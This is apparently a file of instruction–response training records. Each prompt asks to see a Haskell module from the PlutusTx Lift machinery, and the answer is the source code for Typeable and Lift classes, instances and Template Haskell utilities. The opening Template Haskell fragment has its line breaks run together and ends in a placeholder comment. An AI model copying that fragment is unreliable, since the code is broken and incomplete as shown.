TH.datatypeType dataTypeInfolet nonOverlapInstance = TH.InstanceD NothingindexedCons <- for (TH.datatypeCons dataTypeInfo) $ \ctorInfo ->case lookup (TH.constructorName ctorInfo) indices ofJust i -> pure (ctorInfo, i)Nothing -> fail $ "No index given for constructor" ++ show (TH.constructorName ctorInfo)toDataInst <- dolet constraints = TH.datatypeVars dataTypeInfo <&> \tyVarBinder ->TH.classPred ''ToData [TH.VarT (tyvarbndrName tyVarBinder)]toDataDecl <- TH.funD 'toBuiltinData (toDataClauses indexedCons)toDataPrag <- TH.pragInlD 'toBuiltinData TH.Inlinable TH.FunLike TH.AllPhasespure $ nonOverlapInstanceconstraints(TH.classPred ''ToData [appliedType])[toDataPrag, toDataDecl]fromDataInst <- dolet constraints = TH.datatypeVars dataTypeInfo <&> \tyVarBinder ->TH.classPred ''FromData [TH.VarT (tyvarbndrName tyVarBinder)]fromDataDecl <- TH.funD 'fromBuiltinData [fromDataClause indexedCons]fromDataPrag <- TH.pragInlD 'fromBuiltinData TH.Inlinable TH.FunLike TH.AllPhasespure $ nonOverlapInstanceconstraints(TH.classPred ''FromData [appliedType])[fromDataPrag, fromDataDecl]unsafeFromDataInst <- dolet constraints = TH.datatypeVars dataTypeInfo <&> \tyVarBinder ->TH.classPred ''UnsafeFromData [TH.VarT (tyvarbndrName tyVarBinder)]unsafeFromDataDecl <- TH.funD 'unsafeFromBuiltinData [unsafeFromDataClause indexedCons]unsafeFromDataPrag <- TH.pragInlD 'unsafeFromBuiltinData TH.Inlinable TH.FunLike TH.AllPhasespure $ nonOverlapInstanceconstraints(TH.classPred ''UnsafeFromData [appliedType])[unsafeFromDataPrag, unsafeFromDataDecl]pure [toDataInst, fromDataInst, unsafeFromDataInst]-- Other helper functions follow here-- end of the code snippet."}
{"text": "<s>[inst]Can you show me the Haskell implementation of the PlutusTx.Lift.Class module, which includes the Lift and Typeable type classes along with their associated instances for various built-in types? [/inst]-- editorconfig-checker-disable-file\n{-# LANGUAGE CPP                   #-}\n{-# LANGUAGE ConstraintKinds       #-}\n{-# LANGUAGE DataKinds             #-}\n{-# LANGUAGE DerivingStrategies    #-}\n{-# LANGUAGE FlexibleContexts      #-}\n{-# LANGUAGE FlexibleInstances     #-}\n{-# LANGUAGE MultiParamTypeClasses #-}\n{-# LANGUAGE OverloadedStrings     #-}\n{-# LANGUAGE PolyKinds             #-}\n{-# LANGUAGE RankNTypes            #-}\n{-# LANGUAGE ScopedTypeVariables   #-}\n{-# LANGUAGE TypeApplications      #-}\n{-# LANGUAGE TypeOperators         #-}\n{-# LANGUAGE UndecidableInstances  #-}\nmodule PlutusTx.Lift.Class\n    ( Typeable (..)\n    , Lift (..)\n    , RTCompile\n    ) where\n\nimport PlutusIR\nimport PlutusIR.Compiler.Definitions\n\nimport PlutusCore qualified as PLC\nimport PlutusCore.Crypto.BLS12_381.G1 (Element)\nimport PlutusCore.Crypto.BLS12_381.G2 (Element)\nimport PlutusCore.Crypto.BLS12_381.Pairing (MlResult)\nimport PlutusCore.Data\nimport PlutusCore.Quote\nimport PlutusIR.MkPir\nimport PlutusTx.Builtins\nimport PlutusTx.Builtins.HasBuiltin (FromBuiltin, HasFromBuiltin)\nimport PlutusTx.Builtins.Internal (BuiltinBool, BuiltinInteger, BuiltinList, BuiltinPair,\n                                   BuiltinUnit)\n\nimport Language.Haskell.TH qualified as TH hiding (newName)\n\nimport Data.ByteString qualified as BS\nimport Data.Kind qualified as GHC\nimport Data.Proxy\nimport Data.Text qualified as T\nimport GHC.TypeLits (ErrorMessage (..), TypeError)\n\n-- We do not use qualified import because the whole module contains off-chain code\nimport Prelude as Haskell\n\n{- Note [Compiling at TH time and runtime]\nWe want to reuse PIR's machinery for defining datatypes. However, one cannot\nget a PLC Type consisting of the compiled PIR type, because the compilation of the\ndefinitions is done by making a *term*.\n\nSo we use the abstract support for handling definitions in PIR, MonadDefs. Typeable\nthen has `typeRep :: Proxy a -> RTCompile uni fun (Type TyName uni ())`,\nwhich says that you can get the type in some compilation monad (which\nyou will later have to discharge yourself).\n\nThis means that the TH expressions we are generating are not for `Type`s directly, but rather\nfor monadic expressions that will, at runtime, compute types. We are effectively generating\na specialized compiler.\n\nWe thus have two pieces of compilation going on here:\n- At TH time, we reify information about datatypes, and construct specialized compilation expressions\n  for the various parts.\n- At runtime, we actually run these and create definitions etc.\n\nThe interplay between the parts happening at TH time and the parts happening at runtime is somewhat\nawkward, but I couldn't think of a better way of doing it.\n\nA particularly awkward feature is that the typeclass constraints required by the code in each\ninstance are going to be different, and so we can't use reusable functions, instead we need to\ninline all the definitions so that the overall expression can have the right constraints inferred.\n-}\n\ntype RTCompile uni fun = DefT TH.Name uni fun () Quote\n\n-- | Class for types which have a corresponding Plutus IR type. Instances should always be derived,\n-- do not write your own instance!\nclass Typeable uni (a :: k) where\n    -- | Get the Plutus IR type corresponding to this type.\n    typeRep :: Proxy a -> RTCompile uni fun (Type TyName uni ())\n\n-- | Class for types which can be lifted into Plutus IR. Instances should be derived, do not write\n-- your own instance!\nclass Lift uni a where\n    -- | Get a Plutus IR term corresponding to the given value.\n    lift :: a -> RTCompile uni fun (Term TyName Name uni fun ())\n\n-- This instance ensures that we can apply typeable type constructors to typeable arguments and get\n-- a typeable type. We need the kind variable, so that partial application of type constructors\n-- works.\ninstance (Typeable uni (f :: GHC.Type -> k), Typeable uni (a :: GHC.Type)) => Typeable uni (f a) where\n    typeRep _ = TyApp () <$> typeRep (Proxy :: Proxy f) <*> typeRep (Proxy :: Proxy a)\n\n{- Note [Typeable instances for function types]\nSurely there is an obvious 'Typeable' instance for 'a -> b': we just turn it directly\ninto a 'TyFun'!\n\nHowever, if you write this instance, you find that it overlaps with the instance for applied\ntype constructors. For is not '(->) a' an applied type constructor?\n\nVexing. However, if we run with this, we can define a 'Typeable' instance for '(->)' directly.\nWhat is this? Well, it's something like '\\a b . a -> b' as a type function. Which is a rather\nsilly thing to write, but it does work.\n-}\n-- See Note [Typeable instances for function types]\ninstance Typeable uni (->) where\n    typeRep _ = do\n        a <- PLC.liftQuote $ PLC.freshTyName \"a\"\n        b <- PLC.liftQuote $ PLC.freshTyName \"b\"\n        let tvda = TyVarDecl () a (Type ())\n            tvdb = TyVarDecl () b (Type ())\n        pure $ mkIterTyLam [tvda, tvdb] $ TyFun () (mkTyVar () tvda) (mkTyVar () tvdb)\n\n-- Primitives\n\ntypeRepBuiltin\n    :: forall k (a :: k) uni fun. uni `PLC.HasTypeLevel` a\n    => Proxy a -> RTCompile uni fun (Type TyName uni ())\ntypeRepBuiltin (_ :: Proxy a) = pure $ mkTyBuiltin @_ @a ()\n\nliftBuiltin\n    :: forall a uni fun. uni `PLC.HasTermLevel` a\n    => a -> RTCompile uni fun (Term TyName Name uni fun ())\nliftBuiltin = pure . mkConstant ()\n\ninstance (TypeError ('Text \"Int is not supported, use Integer instead\"))\n    => Typeable uni Int where\n    typeRep = Haskell.error \"unsupported\"\n\ninstance (TypeError ('Text \"Int is not supported, use Integer instead\"))\n    => Lift uni Int where\n    lift = Haskell.error \"unsupported\"\n\ninstance uni `PLC.HasTypeLevel` Integer => Typeable uni BuiltinInteger where\n    typeRep = typeRepBuiltin\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTermLevel` Integer => Lift uni BuiltinInteger where\n    lift = liftBuiltin\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTypeLevel` BS.ByteString => Typeable uni BuiltinByteString where\n    typeRep _ = typeRepBuiltin (Proxy @BS.ByteString)\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTermLevel` BS.ByteString => Lift uni BuiltinByteString where\n    lift = liftBuiltin . fromBuiltin\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTypeLevel` T.Text => Typeable uni BuiltinString where\n    typeRep _ = typeRepBuiltin (Proxy @T.Text)\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTermLevel` T.Text => Lift uni BuiltinString where\n    lift = liftBuiltin . fromBuiltin\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTypeLevel` () => Typeable uni BuiltinUnit where\n    typeRep _ = typeRepBuiltin (Proxy @())\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTermLevel` () => Lift uni BuiltinUnit where\n    lift = liftBuiltin . fromBuiltin\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTypeLevel` Bool => Typeable uni BuiltinBool where\n    typeRep _ = typeRepBuiltin (Proxy @Bool)\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTermLevel` Bool => Lift uni BuiltinBool where\n    lift = liftBuiltin . fromBuiltin\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance uni `PLC.HasTypeLevel` [] => Typeable uni BuiltinList where\n    typeRep _ = typeRepBuiltin (Proxy @[])\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance (HasFromBuiltin arep, uni `PLC.HasTermLevel` [FromBuiltin arep]) =>\n        Lift uni (BuiltinList arep) where\n    lift = liftBuiltin . fromBuiltin\n\ninstance uni `PLC.HasTypeLevel` (,) => Typeable uni BuiltinPair where\n    typeRep _ = typeRepBuiltin (Proxy @(,))\n\n-- See Note [Lift and Typeable instances for builtins]\ninstance (HasFromBuiltin arep, uni `PLC.HasTermLevel` FromBuiltin arep, HasFromBuiltin brep,\n          uni `PLC.HasTermLevel` FromBuiltin brep) =>\n         Lift uni (BuiltinPair arep brep) where\n    lift = liftBuiltin . fromBuiltin\n\n"}}
{"text": "<s>[inst]Can you show me the Haskell code for the PlutusTx.Lift.Instances module that includes Lift instances for standard types like Bool, Maybe, Either, and tuples?[/inst]-- editorconfig-checker-disable-file\n{-# LANGUAGE DataKinds             #-}\n{-# LANGUAGE DefaultSignatures     #-}\n{-# LANGUAGE DeriveAnyClass        #-}\n{-# LANGUAGE FlexibleContexts      #-}\n{-# LANGUAGE FlexibleInstances     #-}\n{-# LANGUAGE MultiParamTypeClasses #-}\n{-# LANGUAGE OverloadedStrings     #-}\n{-# LANGUAGE PolyKinds             #-}\n{-# LANGUAGE TemplateHaskell       #-}\n{-# LANGUAGE TypeApplications      #-}\n{-# LANGUAGE TypeOperators         #-}\n{-# LANGUAGE UndecidableInstances  #-}\n{-# OPTIONS_GHC -Wno-orphans #-}\nmodule PlutusTx.Lift.Instances () where\n\nimport PlutusTx.Bool (Bool (..))\nimport PlutusTx.Either (Either (..))\nimport PlutusTx.Lift.TH\nimport PlutusTx.Maybe (Maybe (..))\nimport PlutusTx.These (These (..))\n\n-- Standard types\n-- These need to be in a separate file for TH staging reasons\n\nmakeLift ''Bool\nmakeLift ''Maybe\nmakeLift ''Either\nmakeLift ''These\nmakeLift ''[]\nmakeLift ''()\n-- include a few tuple instances for convenience\nmakeLift ''(,)\nmakeLift ''(,,)\nmakeLift ''(,,,)\nmakeLift ''(,,,,) \n"}
{"text": "<s>[inst]Can you show me the Haskell code for the PlutusTx.Lift.THUtils module, including utility functions for handling Template Haskell types and extensions?[/inst]-- editorconfig-checker-disable-file\n{-# LANGUAGE LambdaCase      #-}\n{-# LANGUAGE TemplateHaskell #-}\nmodule PlutusTx.Lift.THUtils where\n\nimport PlutusIR\nimport PlutusIR.Compiler.Names\n\nimport PlutusCore.Quote\n\nimport Control.Monad\n\nimport Data.Text qualified as T\n\nimport Language.Haskell.TH qualified as TH\nimport Language.Haskell.TH.Datatype qualified as TH\nimport Language.Haskell.TH.Syntax qualified as TH\n\n-- We do not use qualified import because the whole module contains off-chain code\nimport Prelude as Haskell\n\n-- | Very nearly the same as 'TH.showName', but doesn't print uniques, since we don't need to\n-- incorporate them into our names.\nshowName :: TH.Name -> T.Text\nshowName n = T.pack $ case n of\n    TH.Name occ TH.NameS         -> TH.occString occ\n    TH.Name occ (TH.NameQ m)     -> TH.modString m ++ \".\" ++ TH.occString occ\n    TH.Name occ (TH.NameG _ _ m) -> TH.modString m ++ \".\" ++ TH.occString occ\n    TH.Name occ (TH.NameU _)     -> TH.occString occ\n    TH.Name occ (TH.NameL _)     -> TH.occString occ\n\n-- | Normalize a type, in particular getting rid of things like 'TH.ListT' in favour of applications of the actual name.\nnormalizeType :: TH.Type -> TH.Type\nnormalizeType = \\case\n    TH.ForallT b c t       -> TH.ForallT b c (normalizeType t)\n    TH.AppT t1 t2          -> TH.AppT (normalizeType t1) (normalizeType t2)\n    TH.SigT t _            -> normalizeType t\n    TH.InfixT t1 n t2      -> TH.ConT n `TH.AppT` normalizeType t1 `TH.AppT` normalizeType t2\n    TH.UInfixT t1 n t2     -> TH.ConT n `TH.AppT` normalizeType t1 `TH.AppT` normalizeType t2\n    TH.ParensT t           -> normalizeType t\n    TH.ListT               -> TH.ConT ''[]\n    TH.TupleT arity        -> TH.ConT (TH.tupleTypeName arity)\n    TH.UnboxedTupleT arity -> TH.ConT (TH.unboxedTupleTypeName arity)\n    TH.UnboxedSumT arity   -> TH.ConT (TH.unboxedSumTypeName arity)\n    -- some of this stuff probably should be normalized (like tuples) but I don't know quite what to do\n    t                      -> t\n\nrequireExtension :: TH.Extension -> TH.Q ()\nrequireExtension ext = do\n    enabled <- TH.isExtEnabled ext\n    unless enabled $ fail $ \"Extension must be enabled: \" ++ show ext\n\nmkTyVarDecl :: (MonadQuote m) => TH.Name -> Kind () -> m (TH.Name, TyVarDecl TyName ())\nmkTyVarDecl name kind = do\n    tyName <- safeFreshTyName $ showName name\n    pure (name, TyVarDecl () tyName kind)\n\nisNewtype :: TH.DatatypeInfo -> Bool\nisNewtype TH.DatatypeInfo{TH.datatypeVariant=variant} = case variant of\n    TH.Newtype -> True\n    _          -> False\n\n-- | \"Safe\" wrapper around 'TH.listE' for typed TH.\ntyListE :: [TH.TExpQ a] -> TH.TExpQ [a]\ntyListE texps = TH.unsafeTExpCoerce [| $(TH.listE (fmap TH.unTypeQ texps)) |] \n"}
{"text": "<s>[inst]Can you show me the Haskell code for the PlutusTx.Lift.TestInstances module, which includes tests for built-in types in relation to their constraints and instances?[/inst]{-# LANGUAGE ConstraintKinds          #-}\n{-# LANGUAGE FlexibleInstances        #-}\n{-# LANGUAGE MultiParamTypeClasses    #-}\n{-# LANGUAGE QuantifiedConstraints    #-}\n{-# LANGUAGE StandaloneKindSignatures #-}\n{-# LANGUAGE TypeFamilies             #-}\n{-# LANGUAGE TypeOperators            #-}\n{-# LANGUAGE UndecidableInstances     #-}\n{-# LANGUAGE UndecidableSuperClasses  #-}\n\nmodule PlutusTx.Lift.TestInstances () where\n\nimport PlutusCore qualified as PLC\nimport PlutusCore.Builtin qualified as PLC\nimport PlutusTx.Builtins.HasBuiltin\nimport PlutusTx.Lift.Class\n\nimport Data.Kind qualified as GHC\n\n-- | @OnBuiltin constr a@ is the same as @constr (ToBuiltin a)@ except the latter does not work in a\n-- quantified context with GHC-8.10, hence we define this class synonym.\ntype OnBuiltin :: (GHC.Type -> GHC.Constraint) -> GHC.Type -> GHC.Constraint\nclass    constr (ToBuiltin a) => OnBuiltin constr a\ninstance constr (ToBuiltin a) => OnBuiltin constr a\n\n-- | @BuiltinSatisfies pre post a@ holds if @pre (ToBuiltin a)@ implies @post (ToBuiltin a)@.\ntype BuiltinSatisfies\n    :: (GHC.Type -> GHC.Constraint)\n    -> (GHC.Type -> GHC.Constraint)\n    -> GHC.Type\n    -> GHC.Constraint\nclass    (OnBuiltin pre a => OnBuiltin post a) => BuiltinSatisfies pre post a\ninstance (OnBuiltin pre a => OnBuiltin post a) => BuiltinSatisfies pre post a\n\n-- | Test that each built-in type @a@ from 'PLC.DefaultUni' satisfies @post (ToBuiltin a)@ given\n-- @pre (ToBuiltin a)@.\ntype TestAllBuiltinsSatisfy\n    :: (GHC.Type -> GHC.Constraint)\n    -> (GHC.Type -> GHC.Constraint)\n    -> GHC.Constraint\nclass PLC.DefaultUni `PLC.Everywhere` BuiltinSatisfies pre post => TestAllBuiltinsSatisfy pre post\n\n-- | Test that each built-in type from 'PLC.DefaultUni' has a 'Typeable' instance.\ninstance TestAllBuiltinsSatisfy\n    (PLC.AllBuiltinArgs PLC.DefaultUni (Typeable PLC.DefaultUni))\n    (Typeable PLC.DefaultUni)\n\n-- | Test that each built-in type from 'PLC.DefaultUni' has a 'Lift' instance. Since the 'Lift'\n-- instances are defined in terms of 'fromBuiltin', this also tests that each built-in type has a\n-- 'FromBuiltin' instance. Which in turn requires a 'ToBuiltin' instance to exist due to the\n-- superclass constraint, so this is implicitly tested as well.\ninstance TestAllBuiltinsSatisfy\n    (PLC.AllBuiltinArgs PLC.DefaultUni HasFromBuiltin)\n    (Lift PLC.DefaultUni) \n"}
